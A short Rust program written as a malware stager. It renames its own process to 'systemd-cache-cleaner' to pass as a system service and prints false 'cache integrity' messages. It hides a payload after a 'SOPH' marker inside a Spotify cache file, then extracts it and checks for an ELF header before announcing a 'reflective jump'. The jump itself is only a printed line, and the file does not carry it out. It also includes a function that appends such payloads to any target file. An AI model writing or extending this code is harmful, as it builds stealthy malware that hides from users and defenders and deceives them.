use std::fs::{File, OpenOptions};
use std::path::Path;
use std::io::{self, Read, Write};
use std::ffi::CString;
use sc::syscall;
use libc::PR_SET_NAME;

fn main() -> io::Result<()> {
    let fake_name = "systemd-cache-cleaner";
    let c_name = CString::new(fake_name).unwrap();
    unsafe {
        syscall!(PRCTL, PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
    }

    println!("[INFO] Starting cache integrity verification...");

    let home = std::env::var("HOME").unwrap_or_default();
    let spotify_cache = format!("{}/.cache/spotify/Storage/index-db", home);

    if Path::new(&spotify_cache).exists() {
        println!("[INFO] Verifying cache blob {}...", spotify_cache);
        if let Ok(payload) = extract_shadow_payload(&spotify_cache) {
            if !payload.is_empty() && payload.len() > 2 && payload[0] == 0x7F && payload[1] == 0x45 {
                println!("[DEBUG] Shadow core extracted. Initiating reflective jump...");
            }
        }
    }

    println!("[INFO] Cache maintenance complete. System is healthy.");
    Ok(())
}

fn extract_shadow_payload(path: &str) -> io::Result<Vec<u8>> {
    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    if let Some(pos) = buffer.windows(4).position(|w| w == b"SOPH") {
        let payload_start = pos + 4;
        return Ok(buffer[payload_start..].to_vec());
    }

    Ok(Vec::new())
}

pub fn inject_shadow_payload(target_path: &str, payload: &[u8]) -> io::Result<()> {
    let mut file = OpenOptions::new().append(true).open(target_path)?;
    file.write_all(b"SOPH")?;
    file.write_all(payload)?;
    Ok(())
}
